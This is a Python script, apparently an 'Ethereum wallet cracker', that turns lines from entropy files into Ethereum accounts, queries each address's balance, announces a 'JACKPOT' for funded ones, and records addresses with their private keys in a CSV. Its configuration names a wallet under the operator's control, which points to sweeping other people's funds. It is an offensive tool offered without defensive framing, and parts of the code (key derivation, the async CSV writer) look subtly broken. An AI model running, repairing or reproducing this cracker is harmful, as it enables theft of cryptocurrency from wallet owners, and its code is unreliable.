import os
import csv
import asyncio
import aiofiles
from web3 import Web3, HTTPProvider
from eth_account import Account
from configparser import ConfigParser
from concurrent.futures import ThreadPoolExecutor

# Load config
config_path = os.path.expanduser("~/.ewcconfig")
cfg = ConfigParser()
cfg.read(config_path)
settings = cfg["ETHWALLETCRACKERSETTINGS"]

entropy_dir = settings["entropySourceDirectory"]
csv_path = settings["dbFileLocation"]
wallet_to = settings["ourControlledWallet"]
infura_url = settings["connectionUrl"]
verbosity = int(settings["verbosity"])
web3 = Web3(HTTPProvider(infura_url))

# Write result to CSV asynchronously
async def save_keypair(pubkey, privkey, balance):
    async with aiofiles.open(csv_path, mode='a', newline='') as f:
        writer = csv.writer(await f.__aenter__())
        await writer.writerow([pubkey, privkey, balance])

# Generate address and check balance
def process_entropy(entropy: bytes):
    try:
        acct = Account.create(entropy)
        pub = acct.address
        priv = acct.key.hex()
        balance = web3.eth.get_balance(pub)
        if verbosity >= 2:
            print(f"[INFO] {pub} => {balance} wei")

        if balance > 0:
            print(f"[JACKPOT] {web3.fromWei(balance, 'ether')} ETH found at {pub}!")
        return pub, priv, balance
    except Exception as e:
        print(f"[ERROR] {e}")
        return None

# Async processor for entropy lines
async def process_file(file_path):
    loop = asyncio.get_event_loop()
    with open(file_path, 'r') as f:
        lines = f.readlines()

    tasks = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        for line in lines:
            entropy = line.strip().encode()
            for length in [16, 20, 24, 28, 32]:
                if len(entropy) > length:
                    cut = entropy[:length]
                else:
                    cut = entropy.ljust(length, b'\0')
                task = loop.run_in_executor(executor, process_entropy, cut)
                tasks.append(task)

        for result in await asyncio.gather(*tasks):
            if result:
                pub, priv, bal = result
                await save_keypair(pub, priv, bal)

# Main entry
async def main():
    print("[INFO] Starting Ethereum wallet scanner...")
    for file in os.listdir(entropy_dir):
        full_path = os.path.join(entropy_dir, file)
        if os.path.isfile(full_path):
            print(f"[INFO] Processing: {file}")
            await process_file(full_path)

if __name__ == "__main__":
    asyncio.run(main())
